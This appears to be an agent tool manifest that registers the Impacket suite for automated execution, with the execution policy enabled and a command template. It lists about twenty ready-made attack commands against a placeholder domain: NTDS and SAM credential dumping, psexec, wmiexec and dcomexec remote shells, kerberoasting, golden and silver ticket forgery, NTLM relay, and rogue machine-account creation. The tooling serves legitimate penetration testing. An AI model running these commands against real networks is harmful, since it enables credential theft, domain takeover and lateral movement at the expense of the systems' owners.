---
id: security-framework-impacket
namespace: security:framework:impacket
name: impacket
description: Collection of Python classes and scripts for working with network
  protocols and Windows AD, including secretsdump, psexec, wmiexec, kerberoast,
  and NTLM relay tools.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.credential.dump.ntds
  - security.credential.dump.sam
  - security.credential.dump.lsa
  - security.lateral.psexec
  - security.lateral.wmiexec
  - security.lateral.smbexec
  - security.lateral.atexec
  - security.ad.asreproast
  - security.ad.kerberoast
  - security.ad.goldenticket
  - security.ad.silverticket
  - security.ad.ntlmrelay
  - security.ad.enum.users
  - security.ad.enum.shares
  - security.ad.laps
  - security.ad.rbcd
  - security.ad.coerce
  - security.ad.rpcdump
  - security.ad.samrdump
platforms:
  - linux
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - netexec
  - bloodhound
  - evil-winrm
contract:
  inputs:
    - type: network.target.ip
      description: Target IP address or domain controller
    - type: credential.username
      description: Domain username
    - type: credential.password
      description: Plaintext password or NTLM hash
  outputs:
    - type: security.credential.dump
      description: Extracted hashes, plaintext, and tickets
    - type: security.shell.session
      description: Remote shell session (psexec/wmiexec/etc)
  side_effects:
    - network_traffic
    - process_spawn
    - filesystem_write
resource_profile:
  cpu: low
  memory_mb: 128
  network: medium
  disk_io: low
allowed-tools:
  - impacket
parameters:
  - name: script
    type: string
    required: true
    description: "Impacket script name (secretsdump, psexec, wmiexec, etc.)"
  - name: target
    type: string
    required: true
    description: "Target in format user:pass@ip or domain/user:hash@ip"
  - name: action
    type: string
    required: false
    description: "Script-specific action or mode"
execution:
  template: "impacket-{script} {target}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  target: ip
examples:
  - description: "Dump all domain credentials from NTDS.dit"
    command: impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "Dump NTDS.dit with NTLM hash authentication"
    command: impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
  - description: "Remote SAM hive dump"
    command: impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
  - description: "Psexec interactive shell"
    command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "WMI exec (less noisy than psexec)"
    command: impacket-wmiexec evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "SMB exec via Windows SMB shares"
    command: impacket-smbexec evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "Schedule task execution via at.exe / schtasks"
    command: impacket-atexec evilcorp.local/administrator:Pass123@10.10.10.1 whoami
  - description: "AS-REP roasting — find users without pre-authentication"
    command: impacket-GetNPUsers -dc-ip 10.10.10.1 -request evilcorp.local/user
  - description: "Kerberoasting — request TGS for service accounts"
    command: impacket-GetUserSPNs -dc-ip 10.10.10.1 -request evilcorp.local/user:Pass123
  - description: "Get TGT for a user"
    command: impacket-getTGT evilcorp.local/user:Pass123 -dc-ip 10.10.10.1
  - description: "Get service ticket (ST) for impersonation"
    command: impacket-getST -dc-ip 10.10.10.1 -spn cifs/target.evilcorp.local evilcorp.local/user:Pass123
  - description: "Golden ticket — forge KRBTGT ticket"
    command: impacket-ticketer -nthashes <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain evilcorp.local administrator
  - description: "Silver ticket — forge service ticket"
    command: impacket-ticketer -nthashes <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain evilcorp.local -spn cifs/target.evilcorp.local administrator
  - description: "NTLM relay with ntlmrelayx (capture + relay)"
    command: impacket-ntlmrelayx -tf targets.txt -smb2support -socks
  - description: "NTLM relay to LDAP for RBCD"
    command: impacket-ntlmrelayx -t ldap://10.10.10.1 -smb2support --delegate-access
  - description: "Enumerate users via SAMR protocol"
    command: impacket-samrdump -samr 10.10.10.1
  - description: "Enumerate users via LookupSID"
    command: impacket-lookupsid evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "RPC endpoint mapper dump"
    command: impacket-rpcdump 10.10.10.1
  - description: "SMB client interactive shell"
    command: impacket-smbclient evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "DCOM execution via MMC20.Application"
    command: impacket-dcomexec evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "LAPS password reader"
    command: impacket-GetLAPSPasswords -dc-ip 10.10.10.1 evilcorp.local/user:Pass123
  - description: "Add computer to domain (ESC1 machine account)"
    command: impacket-addcomputer -computer-name 'FAKECOMP$' -computer-pass 'FakePass123' -dc-ip 10.10.10.1 evilcorp.local/user:Pass123
references:
  - label: "Impacket GitHub"
    url: "https://github.com/fortra/impacket"
techniques:
  - credential-access
  - lateral-movement
  - privilege-escalation
  - discovery
  - execution
items:
  - Password
  - Hash
  - NoCreds
services:
  - SMB
  - LDAP
  - Kerberos
  - WinRM
  - RPC
attack_types:
  - CredentialAccess
  - LateralMovement
  - PrivilegeEscalation
  - Discovery
install:
    - method: pip
      package_name: "impacket"
      commands:
        - "pip install impacket"
---

# Impacket — AD Exploitation Suite

Impacket is a collection of Python classes for working with network protocols and a suite of executable scripts covering nearly every aspect of Active Directory assessment.

## Key Scripts

| Category | Scripts |
|----------|---------|
| **Credential Dumping** | `secretsdump`, `lsadump`, `samrdump` |
| **Remote Execution** | `psexec`, `wmiexec`, `smbexec`, `atexec`, `dcomexec` |
| **Kerberos** | `GetNPUsers`, `GetUserSPNs`, `getTGT`, `getST`, `ticketer` |
| **Relay** | `ntlmrelayx`, `smbrelayx` |
| **Enumeration** | `lookupsid`, `rpcdump`, `smbclient`, `reg` |
| **AD CS** | `addcomputer`, `GetLAPSPasswords` |
